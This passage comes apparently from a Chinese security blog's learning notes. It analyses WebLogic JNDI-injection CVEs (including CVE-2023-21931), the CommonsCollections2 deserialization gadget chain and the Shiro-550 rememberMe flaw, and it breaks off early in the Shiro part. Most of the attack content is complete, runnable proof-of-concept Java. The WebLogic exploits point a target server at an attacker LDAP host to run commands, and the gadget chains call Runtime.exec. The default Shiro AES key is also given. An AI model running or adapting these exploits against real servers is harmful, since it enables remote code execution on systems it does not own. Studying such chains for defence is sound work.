t3&#x2F;iiop协议支持远程绑定对象bind到服务端，当远程对象继承自OpaqueReference时，lookup查看远程对象时，服务端调用远程对象getReferent方法，其中的remoteJNDIName参数可控，导致攻击者可利用rmi&#x2F;ldap远程协议进行远程命令执行。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="java">package org.example;import javax.naming.Context;import javax.naming.InitialContext;import java.lang.reflect.Field;import java.util.Hashtable;import weblogic.deployment.jms.ForeignOpaqueReference;public class App &#123;    public static void main(String[] args) throws Exception &#123;        String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;        // 创建用来远程绑定对象的InitialContext        String url = &quot;t3://192.168.79.133:7001&quot;; // 目标机器        Hashtable env1 = new Hashtable();        env1.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env1.put(Context.PROVIDER_URL, url); // 目标        InitialContext c = new InitialContext(env1);        // ForeignOpaqueReference的jndiEnvironment属性        Hashtable env2 = new Hashtable();        env2.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        // ForeignOpaqueReference的jndiEnvironment和remoteJNDIName属性        ForeignOpaqueReference f = new ForeignOpaqueReference();        Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField(&quot;jndiEnvironment&quot;);        jndiEnvironment.setAccessible(true);        jndiEnvironment.set(f, env2);        Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField(&quot;remoteJNDIName&quot;);        remoteJNDIName.setAccessible(true);        String ldap = &quot;ldap://192.168.10.14:1389/Basic/Command/calc&quot;;        remoteJNDIName.set(f, ldap);        // 远程绑定ForeignOpaqueReference对象        c.rebind(&quot;sectest&quot;, f);        // lookup查询ForeignOpaqueReference对象        try &#123;            c.lookup(&quot;sectest&quot;);        &#125; catch (Exception e) &#123;        &#125;    &#125;&#125;</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>QpaqueReference在官方文档中提示了当实现此接口的对象从 WLContext 中检索（通过查找或 listBindings）时，由 getReferent() 返回对象。</p><p>因为ForeignOpaqueReference继承QpaqueReference，在远程查询该对象的时候，调用的将会是ForeignOpaqueReference.getReferent方法。</p><p>漏洞利用点在<code>weblogic.deployment.jms.ForeignOpaqueReference.getReferent</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628163800653.png" alt="image-20230628163800653"></p><p>分析这个方法，发现在后续的进行lookup操作之前会检查 JNDI 环境是否已正确配置以访问远程资源，主要是对jndiEnvironment和remoteJNDIName的检测，如果在if中的任何一个条件为真，那么将调用对象的lookup方法，其中<code>remoteJNDIName</code>和<code>jndiEnvironment</code>是可以通过反射修改</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628170005065.png" alt="image-20230628170005065"></p><p>结合上面方框的代码其实可以发现，只要<code>this.jndiEnvironment</code>不为空，就可以对InitialContext进行初始化</p><p>现在要解决的问题是<code>remoteJNDIName</code>和<code>jndiEnvironment</code>要修改成怎样的值才能利用lookup()</p><p>目前能确定的是<code>remoteJNDIName=ldap://x.x.x.x:1389/aaaa</code></p><p>进入lookup,需要满足判断：满足一个条件就行</p><pre><code class="java">if (this.jndiEnvironment == null || !AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)) || this.remoteJNDIName == null || !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX)) &#123;                retVal = context.lookup(evalMacros(this.remoteJNDIName));&#125; </code></pre><p>由于前面<code>jndiEnvironment</code>和<code>remoteJNDIName</code>赋值了，<code>this.jndiEnvironment == null</code>和<code>this.remoteJNDIName == null</code>就不满足了</p><p><code>AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code> 是对 <code>AQJMS_ICF</code> 和 <code>this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)</code> 进行比较。</p><p>其中<code>get(&quot;java.naming.factory.initial&quot;)</code> 方法获取到其属性 “java.naming.factory.initial” 对应的值,如果 <code>AQJMS_ICF</code> 和 <code>this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)</code> 的值相等，那么比较结果将为 <code>true</code>；否则，比较结果将为 <code>false</code></p><p>后面的<code> !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX)</code>的意思是判断remoteJNDIName的开头</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628173243969.png" alt="image-20230628173243969"></p><p>根据POC,jndiEnvironment传入的是一个<code>Hashtable</code> 对象</p><pre><code class="java">Hashtable env2 = new Hashtable();env2.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</code></pre><p>在判断条件 <code>AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code> 中，this.jndiEnvironment.get(“java.naming.factory.initial”) 获取到的是 env2中存储的上下文工厂类com.sun.jndi.rmi.registry.RegistryContextFactory。</p><p>和AQJMS_ICF的值不相等，返回false,前面取“!”  ，变为true所以进入判断</p><p>POC代码似乎没有哪里是不懂的了，目前就先这样</p><h2 id="CVE-2023-21931"><a href="#CVE-2023-21931" class="headerlink" title="CVE-2023-21931"></a>CVE-2023-21931</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞的原理和上面的差不多，漏洞触发点在<code>WLNamingManager</code>类的 <code>getObjectInstance()</code>方法中：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628223712362.png" alt="image-20230628223712362"></p><p>可以看到当传入的 <code>boundObject</code> 对象是 <code>LinkRef</code> 的实现类时，则调用传入对象 <code>boundObject </code> 的 <code>getLinkName()</code> 方法，并通过<code>lookup()</code> 方法对 <code>getLinkName()</code> 方法返回的 <code>linkAddrType</code> 地址进行远程JNDI加载</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628223927784.png" alt="image-20230628223927784"></p><p>漏洞JNDI地址构造在<code>LinkRef</code>这个类中，<code>LinkRef</code>是Java的一个原生类。通过<code>LinkRef</code>类中的构造方法，我们可以控制变量<code>linkAddrType</code>的值， 再通过<code>getLinkName()</code>方法将<code>linkAddrType</code>作为字符串返回。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628224853045.png" alt="image-20230628224853045"></p><p>到这里还有一个疑问，怎样才能调用<code>getObjectInstance()</code>方法？</p><p>参考<a href="https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md">https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md</a></p><p>查看t3的lookup()方法的调用栈：</p><ul><li>Weblogic在接收到请求后，通过<code>BasicServerRef</code>类中的<code>invoke()</code>方法解析传入数据。</li><li>通过<code>_invoke()</code>方法，Weblogic根据传入的方法名<code>resolve_any</code> 执行的<code>resolve_any()</code>方法。</li><li>在<code>resolve_any()</code>方法中，通过<code>resolveObject()</code>方法对传入的绑定命名进行解析。</li><li>在<code>resolveObject()</code>方法中，根据上下文信息调用其中的<code>lookup()</code>方法。</li><li>根据上下文中的信息，经过在<code>WLContextImpl</code>、<code>WLEventContextImpl</code>、 <code>WLEventContextImpl</code> 、<code>RootNamingNode  </code>、<code>ServerNamingNode</code> 、<code>BasicNamingNode</code>类中一系列的<code>lookup()</code>方法调用，实现<code>BasicNamingNode</code>类中的<code>resolveObject()</code>方法调用。</li><li>由于传入<code>resolveObject()</code>方法中的obj不是<code>NamingNode</code>类的实例，且<code>mode</code>的值默认为1，所以会调用<code>WLNamingManager</code>类中的<code>getObjectInstance()</code>方法。</li></ul><p>最终，可以看到<code>WLNamingManager</code>类的<code>getObjectInstance()</code>方法根据传入的对象接口类型，调用对象中的<code>getReferent()</code>方法，完成漏洞触发点的<code>lookup()</code>方法调用。实际上这两个CVE漏洞都是通过<code>getObjectInstance()</code>的两个分支触发的。</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.LinkRef;import java.util.Hashtable;//import weblogic.jndi.internal.WLNamingManager;public class exp &#123;    public static void main(String[] agrs) throws Exception &#123;        String url = &quot;t3://192.168.79.133:7001&quot;;        String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;        Hashtable ht = new Hashtable();        ht.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        ht.put(Context.PROVIDER_URL, url); // 目标        InitialContext c = new InitialContext(ht);        LinkRef LR = new LinkRef(&quot;ldap://192.168.10.14:1389/Basic/Command/whoami&quot;);        c.rebind(&quot;poc&quot;, LR);        c.lookup(&quot;poc&quot;);    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2</title>
      <link href="/2023/06/23/CommonsCollections2/"/>
      <url>/2023/06/23/CommonsCollections2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没学习了，对java的反序列化的知识很陌生，学习一下CC2，打好基础 ,篇幅不多贵在记录</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>CC2使用的是<code>javassist</code>和<code>PriorityQueue</code>来构造利用链；<br>并且使用的是<code>commons-collections-4.0</code>版本，而3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本</p><ul><li>java 1.8_111</li><li>commons-collections4</li></ul><p>在maven项目中的pom文件中添加下面两个依赖</p><pre><code>&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h2 id="字节码编程"><a href="#字节码编程" class="headerlink" title="字节码编程"></a>字节码编程</h2><p>简单认识一下字节码编程：</p><p>字节码编程与反射有一点类似，但是要比反射机制更加强大。</p><p>在反射机制中，可以动态加载类、创建对象，获得类的方法和属性。反射机制是在一个已经被创建好的类上进行操作。然而在字节码编程中，我们不仅可以动态的加载类，还可以依据我们的需求，在程序的运行过程中，创建一个新的类，也可以给修改或添加任何一个类的方法和属性。</p><p><a href="https://songly.blog.csdn.net/article/details/118944928">参考</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先编写一个恶意类：</p><pre><code>package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Evi extends AbstractTranslet&#123;    public  Evi() &#123;        super();        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre><p>这里留个疑问，为什么恶意类要继承<code>AbstractTranslet</code> </p><p>根据网上先辈们的分析，主要利用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类</p><p>这个类中存在一个<code>defineTransletClasses</code>方法，loader.defineClass()方法返回的值存储在_class中，参数<code>_bytecodes</code>是一个字节码</p><p>大概是将<code>_bytecodes</code>中存储的恶意字节码转换为Class对象，并存入_class属性中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623181252085.png" alt="image-20230623181252085"></p><p>存储了有啥用呢？如果这个字节码是恶意的字节码，也需要加载才能利用啊</p><p>继续看<code>TemplatesImpl</code>类的另外一个方法<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623182540379.png" alt="image-20230623182540379"></p><p>这个方法中调用了刚刚的<code>defineTransletClasses</code>方法，把字节码转换为Class对象，并存入_class属性中</p><p>然后调用了<code>newInstance</code>加载Class对象</p><p>思路到这里就可以先构造一下POC</p><p>先把开始构造的恶意类转换成字节码</p><pre><code class="java">ClassPool classPool = ClassPool.getDefault();CtClass ctClass = classPool.getCtClass(&quot;org.example.Evi&quot;);byte[] bytes = ctClass.toBytecode();</code></pre><p>通过反射给私有属性<code>_bytecodes</code>赋值</p><pre><code class="java">Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);//获取私有的有参构造方法Object TemplatesImpl_instance = constructor.newInstance();//将恶意类的字节码设置给_bytecodes属性Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(TemplatesImpl_instance, new byte[][]&#123;bytes&#125;);</code></pre><p>在<code>getTransletInstance()</code>中，如果<code>_name</code>为空就<code>return</code>结束了，如下图</p><p>所以还要给<code>_name</code>赋值,这里赋值随便</p><pre><code class="java">Field name = aClass.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(TemplatesImpl_instance, &quot;Evi&quot;);</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623220242028.png" alt="image-20230623220242028"></p><p>到这里，看看有什么方法能够调用<code>getTransletInstance()</code>,因为这个是个私有的方法，要是能够找到一个<code>public</code>的方法调用它就好了</p><p>在同一个类里边找到了<code>newTransformer()</code>方法，符合要求</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623221024999.png" alt="image-20230623221024999"></p><p>现在要解决的是怎么调用这个方法</p><p>我尝试使用反射的方法调用，但是不知道出了什么问题，用不了，先在这里留个坑，整明白再补,代码如下：</p><pre><code class="java">// 调用newTransformer()方法Method newTransformerMethod = aClass.getMethod(&quot;newTransformer&quot;);newTransformerMethod.setAccessible(true);Transformer transformer = (Transformer) newTransformerMethod.invoke(TemplatesImpl_instance);</code></pre><p>另寻出路</p><p><code>newTransformer()</code>方法返回的是<code>transformer</code>,这个很难不让人想起CC1中的transformer数组，</p><p><code>InvokerTransformer</code>类中有一个<code>transform</code>方法会根据传入的<code>iMethodName</code>，<code>iParamTypes</code>，<code>iArgs</code>这三个成员属性来执行class对象的某个方法，并且这三个属性是根据InvokerTransformer类的构造传入的，然后通过<code>InvokerTransformer</code>类的<code>transform</code>方法来调用<code>newTransformer</code>方法。</p><p>自己的想法(想直接用transform，但是没成功，第二个坑)：</p><pre><code>new InvokerTransformer(&quot;newTransformer&quot;, null, null).transform(TemplatesImpl_instance);</code></pre><p>网上先辈的：使用<code>TransformingComparator</code>来调用<code>transform</code></p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);TransformingComparator transformer_comparator = new TransformingComparator(transformer);</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231301740.png" alt="image-20230623231301740"></p><p><code>TransformingComparator</code>类是一个<code>Comparable </code>对象的<code>comparator</code>比较器，实现了<code>Serializable</code>接口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231607770.png" alt="image-20230623231607770"></p><p><code>TransformingComparator</code>类的compare方法中通过transformer属性来调用transform方法的，如果想要调用InvokerTransformer类的transform方法，可以把InvokerTransformer传给TransformingComparator类的构造来设置transformer属性</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231840514.png" alt="image-20230623231840514"></p><p>所以才有了上面的：</p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);TransformingComparator transformer_comparator = new TransformingComparator(transformer);</code></pre><p>下一步：如何调用<code>TransformingComparator</code>的<code>compare</code>方法？</p><p>根据POC 这里使用的是PriorityQueue集合，PriorityQueue是一个优先队列，每次排序都会触发comparator比较器的compare方法，并且PriorityQueue还重写了readObject方法（反序列化漏洞必要的利用条件）。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152437651.png" alt="image-20230624152437651"></p><p>这里使用了<code>heapify()</code>方法，该方法里面调用了siftDown()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152601658.png" alt="image-20230624152601658"></p><p>查看siftDown():</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152721157.png" alt="image-20230624152721157"></p><p>其中<code>siftDownUsingComparator</code>方法里存在我们想要的<code>compare</code>方法，并且参数可控</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152823718.png" alt="image-20230624152823718"></p><p>后面的有点看不懂了，参考先辈的原话：</p><p>从siftDown方法中可以看出PriorityQueue队列中的comparator属性是一个比较器并且还是可控的，如果comparator属性指定为TransformingComparator比较器的话，不就可以调用TransformingComparator的compare方法了吗，于是万能的反射再次登场了，通过反射将PriorityQueue队列中的comparator属性设置为TransformingComparator比较器，这样PriorityQueue集合在反序列化过程中就会调用comparator比较器了，不得不说PriorityQueue集合完美的符合我们需要构造的利用链。</p><pre><code class="java"> //触发漏洞PriorityQueue queue = new PriorityQueue(2);queue.add(1);queue.add(1);//设置comparator属性Field field = queue.getClass().getDeclaredField(&quot;comparator&quot;);field.setAccessible(true);field.set(queue, transformer_comparator);//设置queue属性field = queue.getClass().getDeclaredField(&quot;queue&quot;);field.setAccessible(true);//队列至少需要2个元素Object[] objects = new Object[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;field.set(queue, objects);</code></pre><p>然后就是序列化和反序列化：</p><pre><code class="java">ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(queue);oos.close();ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));Object object = ois.readObject();</code></pre><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624154542498.png" alt="image-20230624154542498"></p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><pre><code class="java">package org.example;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class App &#123;    public static void main(String[] args) throws Exception &#123;        //构造恶意类TestTemplatesImpl并转换为字节码        ClassPool classPool = ClassPool.getDefault();        CtClass ctClass = classPool.getCtClass(&quot;org.example.Evi&quot;);        byte[] bytes = ctClass.toBytecode();        //反射创建TemplatesImpl        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);        Object TemplatesImpl_instance = constructor.newInstance();        //将恶意类的字节码设置给_bytecodes属性        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(TemplatesImpl_instance, new byte[][]&#123;bytes&#125;);        //设置属性_name为恶意类名        Field name = aClass.getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(TemplatesImpl_instance, &quot;Evi&quot;);        //构造利用链        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);        TransformingComparator transformer_comparator = new TransformingComparator(transformer);        //触发漏洞        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(1);        //设置comparator属性        Field field = queue.getClass().getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(queue, transformer_comparator);        //设置queue属性        field = queue.getClass().getDeclaredField(&quot;queue&quot;);        field.setAccessible(true);        //队列至少需要2个元素        Object[] objects = new Object[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;        field.set(queue, objects);        //序列化 ---&gt; 反序列化        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(queue);        oos.close();        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object object = ois.readObject();    &#125;&#125;</code></pre><p>恶意类：</p><pre><code class="java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Evi extends AbstractTranslet&#123;    public  Evi() &#123;        super();        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre><h2 id="另外一种思路"><a href="#另外一种思路" class="headerlink" title="另外一种思路"></a>另外一种思路</h2><p>先上POC ，这个是Y4tacker大佬写的，学习一下</p><pre><code class="java">package org.example;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Comparator;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;public class App &#123;    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static void main(String[] args) throws Exception &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,                        new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,                        new String[] &#123; &quot;calc.exe&quot; &#125;),        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Comparator comparator = new TransformingComparator(transformerChain);        PriorityQueue queue = new PriorityQueue(2, comparator);        queue.add(1);        queue.add(2);        setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(queue);        oos.close();        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object o = (Object)ois.readObject();    &#125;&#125;</code></pre><p>他没有使用<code>javassist</code>将恶意的类转为字节码加载，而是直接使用CC6中使用到的<code>ChainedTransformer</code>获取恶意代码</p><pre><code class="java">public static void main(String[] args) throws Exception &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,                        new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,                        new String[] &#123; &quot;calc.exe&quot; &#125;),        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Comparator comparator = new TransformingComparator(transformerChain);</code></pre><p>然后后面的基本思路都差不多</p><p>详细的可以参考他的<a href="https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsCollections2/CommonsCollections2.md">分析</a>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化漏洞</title>
      <link href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><code>Apache Shiro</code>是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Shiro反序列化漏洞Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code><strong>和Shiro-721</strong><code>( Apache  Shiro &lt; 1.4.2 )</code><strong>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code><strong>进而反序列化，对比Shiro550条件只要有</strong><code>足够密钥库</code><strong>（条件比较低）、Shiro721需要登录（要求比较高</strong><del><strong>鸡肋</strong></del>）。</p><ul><li><code>Apache Shiro &lt; 1.4.2</code><strong>默认使用</strong><code>AES/CBC/PKCS5Padding</code><strong>模式</strong></li><li><code>Apache Shiro &gt;= 1.4.2</code><strong>默认使用</strong><code>AES/GCM/PKCS5Padding</code><strong>模式</strong></li></ul><h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Apache Shiro&lt; &#x3D;1.2.4提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>那么，Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;伪造RememberMe Cookie值</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我是按照这个搭建的</p><p><a href="https://blog.csdn.net/qq_44769520/article/details/123476443">https://blog.csdn.net/qq_44769520/article/details/123476443</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个漏洞点出在这里</p><pre><code class="java">public T deserialize(byte[] serialized) throws SerializationException &#123;    if (serialized == null) &#123;        String msg = &quot;argument cannot be null.&quot;;        throw new IllegalArgumentException(msg);    &#125;    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try &#123;        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to deserialze argument byte array.&quot;;        throw new SerializationException(msg, e);    &#125;&#125;</code></pre><p>这个是实现反序列化的函数，重点在<code>T deserialized = (T) ois.readObject();</code> </p><p>若能够控制输入的参数<code>serialized</code>，<code>URLDNS</code>这条链就可以实现，既检测出反序列化漏洞</p><p>Alt+F7查找用法<code>deserialize</code>,找到下面两个方法</p><pre><code class="java">protected byte[] serialize(PrincipalCollection principals) &#123;    return getSerializer().serialize(principals);&#125;/** * De-serializes the given byte array by using the &#123;@link #getSerializer() serializer&#125;&#39;s * &#123;@link Serializer#deserialize deserialize&#125; method. * * @param serializedIdentity the previously serialized &#123;@code PrincipalCollection&#125; as a byte array * @return the de-serialized (reconstituted) &#123;@code PrincipalCollection&#125; */protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123;    return getSerializer().deserialize(serializedIdentity);&#125;</code></pre><p>这两个方法一个是进行序列化的，一个是进行反序列化的</p><p>毕竟是逆向分析，选择<code>deserialize</code>往前跟进,在<code>AbstractRememberMeManager.java</code>找到以下方法</p><pre><code class="java">protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;    if (getCipherService() != null) &#123;        bytes = decrypt(bytes);    &#125;    return deserialize(bytes);&#125;</code></pre><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>，一个是解密，一个是反序列化</p><p>查看<code>decrypt</code></p><pre><code class="java">protected byte[] decrypt(byte[] encrypted) &#123;    byte[] serialized = encrypted;    CipherService cipherService = getCipherService();    if (cipherService != null) &#123;        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());        serialized = byteSource.getBytes();    &#125;    return serialized;&#125;</code></pre><p>这里的解密是AES解密，需要一个KEY</p><p>一步步跟踪，找到了这个版本的key<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><pre><code class="java">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = 